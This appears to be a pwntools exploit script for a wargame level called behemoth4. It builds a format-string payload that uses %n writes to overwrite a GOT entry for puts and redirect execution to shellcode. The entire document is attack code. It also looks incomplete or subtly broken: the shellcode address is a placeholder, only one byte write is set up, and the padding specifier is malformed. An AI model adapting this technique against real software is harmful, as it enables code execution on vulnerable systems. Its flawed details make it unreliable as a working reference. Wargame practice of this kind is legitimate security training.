from pwn import *
import sys

PATH = '/behemoth/behemoth4'

address_of_puts = 0x0804b218
address_of_shellcode = 0xffffffff

payload = b'JUNK' 
payload += p32(address_of_puts)
payload += b'JUNK' 
payload += p32(address_of_puts+1)
payload += b'JUNK' 
payload += p32(address_of_puts+2)
payload += b'JUNK' 
payload += p32(address_of_puts+3)

counter = 4*8
byte_to_insert = address_of_shellcode & 0xff
res = byte_to_insert - counter

if res < 0:
    raise ValueError  

payload += b'%x' + str(res).encode() + b'%n'

sys.stdout.buffer.write(payload)
